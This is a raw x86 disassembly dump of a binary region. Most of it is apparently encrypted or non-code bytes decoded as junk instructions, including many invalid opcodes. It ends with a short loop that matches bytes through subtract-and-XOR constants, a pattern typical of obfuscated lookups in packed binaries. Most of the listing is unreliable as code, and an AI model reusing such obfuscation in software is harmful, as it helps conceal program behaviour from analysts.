  41a6d9:	and    eax,0xcdd4b875
  41a6de:	add    eax,0xc832f35c
  41a6e3:	sub    dh,BYTE PTR [esi-0x271d7faa]
  41a6e9:	scas   al,BYTE PTR es:[edi]
  41a6ea:	sub    ah,cl
  41a6ec:	mov    edx,DWORD PTR [ebp-0x41]
  41a6ef:	push   esp
  41a6f0:	cmc    
  41a6f1:	push   esi
  41a6f2:	int    0xbe
  41a6f4:	loopne 0x41a70e
  41a6f6:	mov    BYTE PTR [esi-0x4a],ah
  41a6f9:	shr    BYTE PTR [eax+0x6d],cl
  41a6fc:	cli    
  41a6fd:	pop    ecx
  41a6fe:	hlt    
  41a6ff:	jno    0x41a75c
  41a701:	dec    edi
  41a702:	push   es
  41a703:	sub    BYTE PTR [edx],bl
  41a705:	jns    0x41a6ce
  41a707:	adc    dl,bh
  41a709:	sbb    dh,BYTE PTR [ecx+eiz*1+0x19]
  41a70d:	in     eax,dx
  41a70e:	addr16 in eax,dx
  41a710:	cli    
  41a711:	mov    ah,0x97
  41a713:	out    dx,eax
  41a714:	adc    al,0xb3
  41a716:	test   eax,0x7fe7ea2f
  41a71b:	cmc    
  41a71c:	pop    ebx
  41a71d:	retf   
  41a71e:	pushf  
  41a71f:	stos   DWORD PTR es:[edi],eax
  41a720:	push   ebx
  41a721:	mov    cl,BYTE PTR [edx+eiz*2]
  41a724:	cli    
  41a725:	test   DWORD PTR [ebp+0xecb0133],eax
  41a72b:	das    
  41a72c:	loopne 0x41a717
  41a72e:	call   0xdc37fd72
  41a733:	ret    
  41a734:	out    dx,eax
  41a735:	xchg   ebp,eax
  41a736:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a737:	ins    DWORD PTR es:[edi],dx
  41a738:	inc    edx
  41a739:	pop    edx
  41a73a:	lods   al,BYTE PTR ds:[esi]
  41a73b:	xchg   edx,eax
  41a73c:	jge    0x41a6d3
  41a73e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a73f:	aad    0x4a
  41a741:	imul   edx,eax,0xffffffeb
  41a744:	dec    esp
  41a745:	cmp    ch,BYTE PTR [edx]
  41a747:	mov    ah,dh
  41a749:	pop    ecx
  41a74a:	push   esp
  41a74b:	test   BYTE PTR [esi],0xae
  41a74e:	repnz and eax,0x815fc61c
  41a754:	cmp    esi,esp
  41a756:	push   cs
  41a757:	dec    esi
  41a758:	repz pusha 
  41a75a:	jns    0x41a767
  41a75c:	stos   DWORD PTR es:[edi],eax
  41a75d:	sub    esp,DWORD PTR [ecx+eax*2+0x3a86390a]
  41a764:	arpl   ax,sp
  41a766:	(bad)  
  41a767:	(bad)  
  41a768:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a769:	mov    BYTE PTR ds:0xce8bc38d,al
  41a76f:	and    BYTE PTR [edx-0x20],cl
  41a772:	xchg   ecx,eax
  41a773:	cli    
  41a774:	test   ebx,0xc4fb37e1
  41a77a:	loop   0x41a746
  41a77c:	out    dx,eax
  41a77d:	push   eax
  41a77e:	jmp    DWORD PTR [ecx]
  41a780:	(bad)  
  41a782:	sub    esp,ebp
  41a784:	and    ch,ch
  41a786:	xchg   ecx,eax
  41a787:	fistp  DWORD PTR [ebx+0x52]
  41a78a:	adc    edx,DWORD PTR [edi-0x7f]
  41a78d:	mov    ds:0xa206622d,eax
  41a792:	and    DWORD PTR [ecx-0x68],edx
  41a795:	pop    esi
  41a796:	mov    bl,0x4b
  41a798:	cs cs push ds
  41a79b:	imul   ecx,DWORD PTR [ebx],0xdcdd31fa
  41a7a1:	clc    
  41a7a2:	dec    eax
  41a7a3:	stos   DWORD PTR es:[edi],eax
  41a7a4:	push   eax
  41a7a5:	lock cli 
  41a7a7:	xor    DWORD PTR [edi-0x6defc7b7],esi
  41a7ad:	test   eax,0x45552a9
  41a7b2:	ss jmp 0x41a7d4
  41a7b5:	mov    dl,0xbb
  41a7b7:	gs inc edx
  41a7ba:	imul   esp,ebp,0x2cb8f921
  41a7c0:	arpl   WORD PTR [ebx],sp
  41a7c2:	popa   
  41a7c3:	xchg   edi,eax
  41a7c4:	mov    WORD PTR [ebx],ds
  41a7c6:	or     eax,0xb3dcfa5b
  41a7cb:	xchg   ecx,eax
  41a7cc:	call   DWORD PTR [edx-0x1f5dd0a1]
  41a7d2:	push   es
  41a7d3:	add    ebp,DWORD PTR [edi+0x53]
  41a7d6:	loope  0x41a82b
  41a7d8:	jnp    0x41a76a
  41a7da:	es or  edx,edi
  41a7dd:	nop
  41a7de:	xchg   ebx,eax
  41a7df:	stos   DWORD PTR es:[edi],eax
  41a7e0:	mov    bh,0xbf
  41a7e2:	sbb    cl,bl
  41a7e4:	imul   esi,DWORD PTR [edx+0x6c9cd7f7],0x6b5278e0
  41a7ee:	ret    
  41a7ef:	inc    eax
  41a7f0:	pop    edi
  41a7f1:	ret    
  41a7f2:	into   
  41a7f3:	mov    DWORD PTR [ecx+ebx*4],edx
  41a7f6:	stos   DWORD PTR es:[edi],eax
  41a7f7:	xchg   esi,eax
  41a7f8:	xchg   ebx,eax
  41a7f9:	push   esp
  41a7fa:	ret    0x5cb
  41a7fd:	xchg   ebp,eax
  41a7fe:	push   esp
  41a7ff:	aaa    
  41a800:	mov    esp,0x933a99b
  41a805:	or     ebx,edx
  41a807:	and    DWORD PTR [ecx+eax*2-0x4d],ecx
  41a80b:	xor    cl,BYTE PTR [edx]
  41a80d:	ror    DWORD PTR [ecx-0x22],0xfe
  41a811:	xchg   esi,eax
  41a812:	jnp    0x41a863
  41a814:	leave  
  41a815:	inc    ecx
  41a816:	add    esp,DWORD PTR [eax+ebp*8+0x4c]
  41a81a:	test   BYTE PTR [ebx],0xc3
  41a81d:	xchg   edi,eax
  41a81e:	inc    ebp
  41a81f:	push   esi
  41a820:	js     0x41a839
  41a822:	out    dx,eax
  41a823:	inc    edi
  41a824:	out    0xa3,al
  41a826:	mov    ecx,0x6ed052de
  41a82b:	dec    eax
  41a82c:	mov    DWORD PTR [edi+0x56],ebp
  41a82f:	mov    ebp,0xf6024fed
  41a834:	dec    esi
  41a835:	call   0x209e:0x5f195438
  41a83c:	or     ah,ch
  41a83e:	mov    esp,0xcbf3d750
  41a843:	xchg   ecx,eax
  41a844:	pop    ds
  41a845:	mov    al,ds:0xd8d8d78d
  41a84a:	mov    BYTE PTR [eax+esi*2-0x3e6c3578],0x4a
  41a852:	push   eax
  41a853:	sub    eax,0xb7a4cc4a
  41a858:	dec    eax
  41a859:	shl    DWORD PTR [ebx],cl
  41a85b:	aas    
  41a85c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a85d:	retf   0xb48d
  41a860:	cli    
  41a861:	lock inc ecx
  41a863:	lock ss sbb eax,0x4cf6a5e7
  41a86a:	sbb    al,0x63
  41a86c:	and    BYTE PTR [esi+eiz*2],dl
  41a86f:	jnp    0x41a7fd
  41a871:	lock cmp eax,edx
  41a874:	mov    esi,0x865959e7
  41a879:	cmp    DWORD PTR [esp+ebp*4],edx
  41a87c:	mov    edx,DWORD PTR [ebp+ecx*4+0x37019342]
  41a883:	inc    edx
  41a884:	ds mov ebx,0xb4952897
  41a88a:	cld    
  41a88b:	and    eax,DWORD PTR [ebx]
  41a88d:	rol    DWORD PTR [esi-0x8],cl
  41a890:	(bad)  [ebp-0x1a]
  41a893:	stc    
  41a894:	push   ebp
  41a895:	(bad)  
  41a896:	push   edi
  41a897:	cmp    BYTE PTR [esp+eax*2-0x58333d5f],al
  41a89e:	or     al,0x14
  41a8a0:	ins    BYTE PTR es:[edi],dx
  41a8a1:	loopne 0x41a88e
  41a8a3:	mov    esp,0x14352ef1
  41a8a8:	mov    ch,0x66
  41a8aa:	je     0x41a8f9
  41a8ac:	cwde   
  41a8ad:	popf   
  41a8ae:	cmp    DWORD PTR [ecx-0x6b91519b],eax
  41a8b4:	jecxz  0x41a881
  41a8b6:	pop    esp
  41a8b7:	push   edi
  41a8b8:	retf   0x4107
  41a8bb:	mov    bh,0x8e
  41a8bd:	pop    edi
  41a8be:	mov    DWORD PTR [ebp-0x1d],ebp
  41a8c1:	shl    DWORD PTR [ebp-0x21],0x7f
  41a8c5:	sahf   
  41a8c6:	das    
  41a8c7:	jbe    0x41a8c2
  41a8c9:	aad    0xa2
  41a8cb:	inc    edx
  41a8cc:	push   ebp
  41a8cd:	pop    ss
  41a8ce:	out    dx,eax
  41a8cf:	xchg   edi,eax
  41a8d0:	imul   edi,DWORD PTR [esi],0xb92e93c4
  41a8d6:	sub    al,dl
  41a8d8:	or     al,0x7c
  41a8da:	cli    
  41a8db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a8dc:	or     ch,BYTE PTR [ecx]
  41a8de:	cdq    
  41a8df:	jmp    0xcb1c798d
  41a8e4:	int    0xdf
  41a8e6:	xor    DWORD PTR [ebp+0x7baa295a],edi
  41a8ec:	jne    0x41a954
  41a8ee:	inc    esp
  41a8ef:	mov    ebp,0x18f80fe0
  41a8f4:	test   DWORD PTR [ecx],ecx
  41a8f6:	out    dx,al
  41a8f7:	sbb    bh,dl
  41a8f9:	fidivr WORD PTR [ebp-0x5b55a0c7]
  41a8ff:	hlt    
  41a900:	enter  0xf43e,0x55
  41a904:	fdivr  st,st(7)
  41a906:	push   eax
  41a907:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a908:	jmp    0x26be41ef
  41a90d:	mov    eax,ds:0x47c645d7
  41a912:	sbb    BYTE PTR [eax-0x7e],0x3f
  41a916:	cmp    cl,BYTE PTR [edi-0x3e321fb4]
  41a91c:	stc    
  41a91d:	cmp    al,0x41
  41a91f:	pop    edx
  41a920:	(bad)  
  41a921:	out    dx,eax
  41a922:	dec    esi
  41a923:	ja     0x41a948
  41a925:	(bad)  
  41a926:	push   edi
  41a927:	leave  
  41a928:	jne    0x41a8e7
  41a92a:	js     0x41a9a2
  41a92c:	test   BYTE PTR [ecx+0x19],ch
  41a92f:	pop    ss
  41a930:	iret   
  41a931:	in     eax,0x70
  41a933:	sti    
  41a934:	mov    edx,0x7e718998
  41a939:	aas    
  41a93a:	adc    ah,cl
  41a93c:	sbb    eax,0x7ec0c466
  41a941:	push   eax
  41a942:	and    DWORD PTR [ecx],esp
  41a944:	xor    al,0x4c
  41a946:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a947:	xchg   ebp,eax
  41a948:	int3   
  41a949:	mov    dl,0x44
  41a94b:	idiv   DWORD PTR [ebx+eiz*1+0x61b74637]
  41a952:	sar    al,0xc1
  41a955:	push   ss
  41a956:	jl     0x41a986
  41a958:	push   es
  41a959:	jge    0x41a96a
  41a95b:	jo     0x41a8e8
  41a95d:	inc    DWORD PTR [ecx+0x27]
  41a960:	or     al,0x90
  41a962:	jbe    0x41a94f
  41a964:	push   es
  41a965:	xor    BYTE PTR [edx],ah
  41a967:	out    0x7c,al
  41a969:	or     DWORD PTR es:[edi-0x36],edx
  41a96d:	adc    bl,BYTE PTR [edx-0x5b]
  41a970:	dec    edx
  41a971:	(bad)  
  41a972:	call   DWORD PTR [edx+0x22]
  41a975:	popf   
  41a976:	dec    ebp
  41a977:	push   es
  41a978:	fidivr WORD PTR [ecx-0x46e885b3]
  41a97e:	repz test dl,bl
  41a981:	push   0x5fbc5d53
  41a986:	mov    esp,ebx
  41a988:	pop    ds
  41a989:	jmp    0x41a917
  41a98b:	mov    dh,0xd6
  41a98d:	clc    
  41a98e:	(bad)  
  41a98f:	jle    0x41a9b2
  41a991:	bswap  eax
  41a993:	(bad)
  41a998:	xchg   edi,eax
  41a999:	xor    BYTE PTR [ebx+0x33],0x17
  41a99d:	dec    eax
  41a99e:	and    al,0x12
  41a9a0:	(bad)  
  41a9a1:	and    DWORD PTR [edi],esp
  41a9a3:	push   ebx
  41a9a4:	jecxz  0x41a933
  41a9a6:	je     0x41aa21
  41a9a8:	fidivr WORD PTR [edi+0xe]
  41a9ab:	call   DWORD PTR [edi+0x10533386]
  41a9b1:	ja     0x41a9e0
  41a9b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a9b4:	push   cs
  41a9b5:	lock xchg esi,eax
  41a9b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a9b8:	and    eax,0x8757f72e
  41a9bd:	pusha  
  41a9be:	jne    0x41aa29
  41a9c0:	in     eax,dx
  41a9c1:	(bad)
  41a9c4:	stc    
  41a9c5:	add    DWORD PTR [ecx],esp
  41a9c7:	daa    
  41a9c8:	pop    edx
  41a9c9:	sbb    cl,BYTE PTR [edx+0x5d]
  41a9cc:	inc    esi
  41a9cd:	imul   DWORD PTR [ebp+0x476e2760]
  41a9d3:	call   0xfeb3:0x64e8e955
  41a9da:	xchg   bl,dl
  41a9dc:	jmp    0x515d:0x46ae8fdb
  41a9e3:	and    DWORD PTR [eax],0xe11b7079
  41a9e9:	add    eax,0x3ddac7e5
  41a9ee:	ret    0xe32
  41a9f1:	mov    cl,0xd9
  41a9f3:	adc    bh,BYTE PTR [edi]
  41a9f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a9f6:	stos   DWORD PTR es:[edi],eax
  41a9f7:	mov    cs,edi
  41a9f9:	aam    0xe2
  41a9fb:	mov    al,0xb0
  41a9fd:	cdq    
  41a9fe:	push   0x0
  41aa00:	and    esp,DWORD PTR [eax+0x6c]
  41aa03:	imul   edi,DWORD PTR [edi+0x4f],0xfffffff9
  41aa07:	(bad)  
  41aa08:	mov    ecx,0x3fd765aa
  41aa0d:	jno    0x41a997
  41aa0f:	xor    BYTE PTR [ebp+eiz*4+0x4e03d272],bh
  41aa16:	cmc    
  41aa17:	rcr    al,1
  41aa19:	add    al,0xbe
  41aa1b:	popf   
  41aa1c:	add    esp,ebx
  41aa1e:	cwde   
  41aa1f:	pushf  
  41aa20:	lods   al,BYTE PTR ds:[esi]
  41aa21:	(bad)  
  41aa22:	std    
  41aa23:	jbe    0x41a9d8
  41aa25:	(bad)  
  41aa26:	xchg   edx,eax
  41aa27:	xor    BYTE PTR [esi-0x5530e21e],bh
  41aa2d:	add    BYTE PTR [edx],ah
  41aa2f:	add    DWORD PTR [esi+0x5d],eax
  41aa32:	jbe    0x41a9f0
  41aa34:	fstp   QWORD PTR [edx-0x30]
  41aa37:	dec    esi
  41aa38:	js     0x41a9c6
  41aa3a:	dec    edx
  41aa3b:	and    BYTE PTR [esi-0x365f9336],0x1
  41aa42:	xor    dl,BYTE PTR [edi-0x41a38d9]
  41aa48:	mov    eax,0xff855862
  41aa4d:	or     esi,esi
  41aa4f:	mov    bl,0x42
  41aa51:	leave  
  41aa52:	mov    al,0x24
  41aa54:	lock add DWORD PTR [ebx+eiz*4],eax
  41aa58:	push   cs
  41aa59:	stc    
  41aa5a:	jl     0x41aab8
  41aa5c:	retf   
  41aa5d:	pop    es
  41aa5e:	and    cl,dl
  41aa60:	cld    
  41aa61:	mov    esp,0x9648b6e5
  41aa66:	lahf   
  41aa67:	out    0xcf,al
  41aa69:	je     0x41aabb
  41aa6b:	shl    BYTE PTR [esi-0x2d],0x15
  41aa6f:	jecxz  0x41a9fe
  41aa71:	lds    edi,FWORD PTR [ebx-0x7daba4a5]
  41aa77:	cmc    
  41aa78:	sbb    esp,ebp
  41aa7a:	jo     0x41aa44
  41aa7c:	push   edx
  41aa7d:	pushf  
  41aa7e:	mov    esp,0xd09b63ff
  41aa83:	mov    ebp,0xbb9c8ec1
  41aa88:	fidivr WORD PTR [edi+ecx*2+0x7a]
  41aa8c:	jl     0x41aa18
  41aa8e:	and    dl,ch
  41aa90:	fwait
  41aa91:	mov    ds:0x35610b8b,eax
  41aa96:	ret    
  41aa97:	mov    ah,ah
  41aa99:	ins    DWORD PTR es:[edi],dx
  41aa9a:	fsubr  st,st(1)
  41aa9c:	out    0x6f,al
  41aa9e:	lods   al,BYTE PTR ds:[esi]
  41aa9f:	sub    eax,0xfa77af5d
  41aaa4:	push   esi
  41aaa5:	shr    BYTE PTR [ecx+0x1c],0xf8
  41aaa9:	push   ecx
  41aaaa:	mov    bl,0x53
  41aaac:	xchg   ebp,eax
  41aaad:	jecxz  0x41aa3b
  41aaaf:	(bad)  
  41aab0:	dec    BYTE PTR [eax]
  41aab2:	and    BYTE PTR [si],cl
  41aab5:	cmp    eax,DWORD PTR [edx-0x5e]
  41aab8:	pop    ebp
  41aab9:	popf   
  41aaba:	or     BYTE PTR [ebp+0x12],0xc5
  41aabe:	repnz (bad) 
  41aac0:	inc    eax
  41aac1:	pop    ss
  41aac2:	hlt    
  41aac3:	ins    BYTE PTR es:[edi],dx
  41aac4:	add    ch,dh
  41aac6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aac7:	mov    esi,0xf32d9921
  41aacc:	aad    0x8a
  41aace:	dec    ebp
  41aacf:	lea    eax,[ebx+0x6a]
  41aad2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aad3:	and    eax,0x8eae0175
  41aad8:	aas    
  41aad9:	retf   
  41aada:	repnz xchg ebx,eax
  41aadc:	mov    dh,0xae
  41aade:	pop    ecx
  41aadf:	js     0x41ab37
  41aae1:	and    al,0x52
  41aae3:	je     0x41ab5b
  41aae5:	mov    ebp,0xe615e10a
  41aaea:	(bad)  
  41aaeb:	lock call 0x6e09b16b
  41aaf1:	pop    ebp
  41aaf2:	hlt    
  41aaf3:	fwait
  41aaf4:	or     esi,DWORD PTR [ebp+edx*8+0x2820b1ce]
  41aafb:	push   edx
  41aafc:	mov    esi,0x369882d6
  41ab01:	mov    ecx,0xb8b5fd00
  41ab06:	in     al,0x5d
  41ab08:	mov    bl,0xb3
  41ab0a:	neg    BYTE PTR [ecx-0x4c247ceb]
  41ab10:	dec    edi
  41ab11:	adc    bh,ah
  41ab13:	setnp  dh
  41ab16:	loop   0x41ab1d
  41ab18:	add    eax,0x1e26cd3
  41ab1d:	inc    ebx
  41ab1e:	out    dx,al
  41ab1f:	xchg   BYTE PTR [eax],al
  41ab21:	cmc    
  41ab22:	cmp    al,0x7e
  41ab24:	xlat   BYTE PTR ds:[ebx]
  41ab25:	je     0x41ab32
  41ab27:	lock outs dx,DWORD PTR ds:[esi]
  41ab29:	xor    eax,0x28334381
  41ab2e:	mov    esp,0x8e1c7b24
  41ab33:	pop    ebp
  41ab34:	call   0x97a5:0xb0c037a0
  41ab3b:	or     BYTE PTR [edx+ebx*2+0x7d],al
  41ab3f:	inc    edx
  41ab40:	cmp    BYTE PTR [edx+0x1e],bl
  41ab43:	xchg   DWORD PTR [eax+0x2f],esp
  41ab46:	sbb    DWORD PTR [edx+0x2b803701],0xffffff83
  41ab4d:	stos   DWORD PTR es:[edi],eax
  41ab4e:	cs stc 
  41ab50:	addr16 pop ss
  41ab52:	and    BYTE PTR [ecx+0x1a],ah
  41ab55:	xor    edi,ecx
  41ab57:	add    eax,0x5bc2acfd
  41ab5c:	xchg   ax,ax
  41ab5e:	call   0xd192:0xdf0a5b2
  41ab65:	cwde   
  41ab66:	mov    al,0x93
  41ab68:	jle    0x41ab2e
  41ab6a:	stc    
  41ab6b:	mov    ds:0x8d7dd6f2,al
  41ab70:	lods   eax,DWORD PTR ds:[esi]
  41ab71:	imul   ebx,DWORD PTR fs:[edi],0x3e8b7bd
  41ab78:	aaa    
  41ab79:	xlat   BYTE PTR ds:[bx]
  41ab7b:	xor    DWORD PTR [ecx+0x7bc5e65d],ecx
  41ab81:	ja     0x41abe2
  41ab83:	mov    al,ds:0xb0c3fe5e
  41ab88:	jae    0x41ab16
  41ab8a:	lahf   
  41ab8b:	inc    DWORD PTR [ecx-0x55]
  41ab8e:	adc    bh,BYTE PTR [edi+edx*1+0x34]
  41ab92:	loop   0x41abc3
  41ab94:	sub    al,0x21
  41ab96:	outs   dx,DWORD PTR ds:[esi]
  41ab97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ab98:	inc    esp
  41ab99:	aas    
  41ab9a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ab9b:	sbb    DWORD PTR [ebx+0x791487f5],edx
  41aba1:	mov    al,ah
  41aba3:	add    DWORD PTR [esi],edx
  41aba5:	pushf  
  41aba6:	and    eax,0xa91f467f
  41abab:	or     BYTE PTR ds:0x745d59d6,dh
  41abb1:	fdivrp st(6),st
  41abb3:	into   
  41abb4:	jne    0x41ac20
  41abb6:	mov    ds:0x49a8ec5f,eax
  41abbb:	fs pop es
  41abbd:	gs aas 
  41abbf:	add    BYTE PTR [edi-0x1e0b0c03],dl
  41abc5:	cmp    cl,cl
  41abc7:	and    DWORD PTR [ecx-0x66911239],ecx
  41abcd:	ror    DWORD PTR [ecx+ecx*2+0x2c7f3639],cl
  41abd4:	jbe    0x41ab70
  41abd6:	(bad)  
  41abd7:	stos   BYTE PTR es:[edi],al
  41abd8:	scas   al,BYTE PTR es:[edi]
  41abd9:	jbe    0x41ab70
  41abdb:	inc    cl
  41abdd:	imul   esp,DWORD PTR [eax-0x16],0x6b
  41abe1:	xor    al,0xc6
  41abe3:	add    eax,0x977556f3
  41abe8:	mov    ebx,esi
  41abea:	sbb    al,0x7d
  41abec:	cdq    
  41abed:	push   eax
  41abee:	adc    al,0xa8
  41abf0:	pop    ebp
  41abf1:	cmp    bh,cl
  41abf3:	pop    eax
  41abf4:	hlt    
  41abf5:	popa   
  41abf6:	mov    ebx,0x41b9d11e
  41abfb:	adc    esp,esp
  41abfd:	xchg   ecx,eax
  41abfe:	jle    0x41ac39
  41ac00:	xor    DWORD PTR [edi],0x5de7f266
  41ac06:	mov    ebp,0x491f26
  41ac0b:	gs push 0x92d9d54b
  41ac11:	ror    DWORD PTR [esi+0x56],0xf
  41ac15:	and    BYTE PTR [ebx+0x702aafa0],al
  41ac1b:	rcr    DWORD PTR [edx+0x36339304],0x27
  41ac22:	shr    BYTE PTR [eax-0x47],cl
  41ac25:	sub    BYTE PTR [ebp-0x7925c221],dl
  41ac2b:	scas   eax,DWORD PTR es:[edi]
  41ac2c:	mov    dl,0xa1
  41ac2e:	add    eax,0x3c5bdf4f
  41ac33:	mov    dl,0xf3
  41ac35:	gs xchg bl,dh
  41ac38:	xchg   esp,eax
  41ac39:	fwait
  41ac3a:	daa    
  41ac3b:	jle    0x41ac15
  41ac3d:	pop    ds
  41ac3e:	es pop edi
  41ac40:	xchg   ebx,eax
  41ac41:	ficom  WORD PTR [edi-0x64]
  41ac44:	js     0x41ac4f
  41ac46:	scas   eax,DWORD PTR es:[edi]
  41ac47:	test   BYTE PTR fs:[ebp-0x52],cl
  41ac4b:	imul   BYTE PTR [edx+0x4d]
  41ac4e:	or     al,0x71
  41ac50:	test   DWORD PTR [ecx+0x2a],esi
  41ac53:	cmc    
  41ac54:	jecxz  0x41ac70
  41ac56:	dec    ebp
  41ac57:	dec    ebx
  41ac58:	mov    esi,0x749f42a2
  41ac5d:	fs sahf 
  41ac5f:	mov    ebx,0xcac3d749
  41ac64:	sbb    eax,0xc9a7626c
  41ac69:	pop    esi
  41ac6a:	ficom  DWORD PTR [ecx]
  41ac6c:	out    0xbe,al
  41ac6e:	enter  0xb78b,0xbd
  41ac72:	mov    ebp,0xc870e01
  41ac77:	retf   
  41ac78:	(bad)  
  41ac79:	int3   
  41ac7a:	sub    DWORD PTR [ecx],ecx
  41ac7c:	jb     0x41acb3
  41ac7e:	test   DWORD PTR [eax-0x1e],ebx
  41ac81:	fxch   st(1)
  41ac83:	push   es
  41ac84:	test   eax,0x23494512
  41ac89:	ror    BYTE PTR [ebp-0x1a],cl
  41ac8c:	add    DWORD PTR [eax+0x53bc4784],edi
  41ac92:	dec    edi
  41ac93:	pop    esi
  41ac94:	ret    0x12fd
  41ac97:	dec    ebp
  41ac98:	jmp    0x41ad14
  41ac9a:	aad    0x12
  41ac9c:	adc    DWORD PTR [eax-0x680eb625],esp
  41aca2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aca3:	and    al,0x67
  41aca5:	mov    ecx,0x472393f4
  41acaa:	aas    
  41acab:	dec    edx
  41acac:	ret    0xc121
  41acaf:	sbb    BYTE PTR [edx-0x79ce76fb],cl
  41acb5:	mov    ds:0xefe97248,al
  41acba:	or     eax,0xcf752a85
  41acbf:	push   eax
  41acc0:	xchg   ebx,eax
  41acc1:	shl    BYTE PTR [ebx+0x2de9300],0xb5
  41acc8:	sub    al,0xb6
  41acca:	dec    DWORD PTR [esi+eax*4-0x60931be]
  41acd1:	mov    DWORD PTR [edx],eax
  41acd3:	sahf   
  41acd4:	aad    0x90
  41acd6:	dec    eax
  41acd7:	xor    edx,edi
  41acd9:	mov    ecx,esi
  41acdb:	daa    
  41acdc:	push   ebx
  41acdd:	jecxz  0x41acd8
  41acdf:	mov    WORD PTR [ebp-0xe57d7b],?
  41ace5:	into   
  41ace6:	and    BYTE PTR [ebp-0x7dc0e586],dh
  41acec:	(bad)
  41acef:	sti    
  41acf0:	xchg   esp,eax
  41acf1:	addr16 pop es
  41acf3:	dec    edi
  41acf4:	ins    DWORD PTR es:[edi],dx
  41acf5:	popa   
  41acf6:	mov    ds:0x68ca2d9,eax
  41acfb:	xchg   ebp,eax
  41acfc:	retf   0x5e20
  41acff:	std    
  41ad00:	mov    cs,WORD PTR [edx+0x11]
  41ad03:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ad04:	sbb    DWORD PTR [edi+ebx*1+0x2c],ecx
  41ad08:	sub    ebx,DWORD PTR [edx+0x298bfe10]
  41ad0e:	popf   
  41ad0f:	lods   al,BYTE PTR ds:[esi]
  41ad10:	push   ss
  41ad11:	xlat   BYTE PTR ds:[ebx]
  41ad12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ad13:	(bad)  
  41ad14:	fnstenv [esi+eiz*2+0xa]
  41ad18:	sbb    eax,0xe2555a4b
  41ad1d:	push   edi
  41ad1e:	dec    esi
  41ad1f:	gs iret 
  41ad21:	push   ecx
  41ad22:	xor    eax,0x1e2afafe
  41ad27:	dec    esp
  41ad28:	(bad)  
  41ad29:	ins    BYTE PTR es:[edi],dx
  41ad2a:	pop    ecx
  41ad2b:	pop    esp
  41ad2c:	jg     0x41acbd
  41ad2e:	xchg   BYTE PTR [edi+0x12],ah
  41ad31:	aad    0x1b
  41ad33:	pushf  
  41ad34:	sbb    al,BYTE PTR [edx+0x2e]
  41ad37:	sbb    eax,0x63c717d6
  41ad3c:	iret   
  41ad3d:	dec    edi
  41ad3e:	stos   BYTE PTR es:[edi],al
  41ad3f:	dec    DWORD PTR ds:0xcf8ace54
  41ad45:	iret   
  41ad46:	aad    0x5c
  41ad48:	mov    esi,0xced6f175
  41ad4d:	dec    ebp
  41ad4e:	jne    0x41ad49
  41ad50:	lods   eax,DWORD PTR ds:[esi]
  41ad51:	sub    al,0xca
  41ad53:	mov    dh,0xc0
  41ad55:	mov    esp,eax
  41ad57:	push   ebx
  41ad58:	xorps  xmm0,XMMWORD PTR [eax-0x74394e94]
  41ad5f:	mov    ds:0xf056c98f,eax
  41ad64:	test   al,0xf2
  41ad66:	cs ds jno 0x41ada4
  41ad6a:	adc    ch,BYTE PTR [ebp+ecx*1+0x47467386]
  41ad71:	xor    ah,ch
  41ad73:	loop   0x41adba
  41ad75:	pop    eax
  41ad76:	ret    
  41ad77:	dec    esp
  41ad78:	repz xor ebx,DWORD PTR [ebx]
  41ad7b:	mov    ds:0xa7d54c4,eax
  41ad80:	mov    ds:0x5539f905,eax
  41ad85:	sbb    al,0x7f
  41ad87:	sub    al,0x4
  41ad89:	mov    gs,WORD PTR [esi+0x25c9baa]
  41ad8f:	or     BYTE PTR [ecx],bh
  41ad91:	or     ebx,DWORD PTR ds:[ebx-0x66]
  41ad95:	call   0x1fe8cce1
  41ad9a:	mov    eax,0xcc070b5e
  41ad9f:	xchg   BYTE PTR [ebx+0x79],al
  41ada2:	pop    eax
  41ada3:	test   al,0x69
  41ada5:	jmp    0xe433:0x7bd7fbe5
  41adac:	ja     0x41ad4a
  41adae:	fs jmp 0x52854def
  41adb4:	sar    BYTE PTR [ecx],cl
  41adb6:	ficomp WORD PTR [ecx+0x1c]
  41adb9:	add    al,BYTE PTR [ebx-0x5d]
  41adbc:	ficomp WORD PTR [ecx+0x491b57a3]
  41adc2:	rol    DWORD PTR [ebx+0x28cfe0a6],0xa7
  41adc9:	aas    
  41adca:	dec    esi
  41adcb:	dec    ebp
  41adcc:	pop    esp
  41adcd:	fucomp st(1)
  41adcf:	inc    ebx
  41add0:	scas   al,BYTE PTR es:[edi]
  41add1:	mov    edx,0xd0174da6
  41add6:	call   FWORD PTR [edi+0x59]
  41add9:	js     0x41ae15
  41addb:	rol    DWORD PTR [ebx-0xbc667a4],cl
  41ade1:	(bad)  
  41ade2:	rcl    BYTE PTR [esi+0x3072293a],cl
  41ade8:	arpl   WORD PTR [edx+0x458904b9],bx
  41adee:	clc    
  41adef:	push   DWORD PTR [ebp+0x18]
  41adf2:	jmp    0x41ae4b
  41adf7:	mov    ecx,DWORD PTR [ebp-0x8]
  41adfa:	add    ecx,eax
  41adfc:	mov    DWORD PTR [ebp-0x14],ecx
  41adff:	mov    ecx,DWORD PTR [ebp-0x14]
  41ae02:	mov    ecx,DWORD PTR [ecx+0xc]
  41ae05:	movsx  cx,BYTE PTR [ecx+eax*1]
  41ae0a:	mov    edx,0x3b4b
  41ae0f:	sub    cx,dx
  41ae12:	mov    edx,0x8a85
  41ae17:	xor    cx,dx
  41ae1a:	mov    edx,0x4f85
  41ae1f:	cmp    cx,dx
  41ae22:	jne    0x41adef
  41ae28:	mov    ecx,DWORD PTR ds:0x421c66
  41ae2e:	mov    ecx,DWORD PTR [ecx+0x198]
  41ae34:	mov    DWORD PTR [ecx],eax
  41ae36:	jmp    0x41ae5c
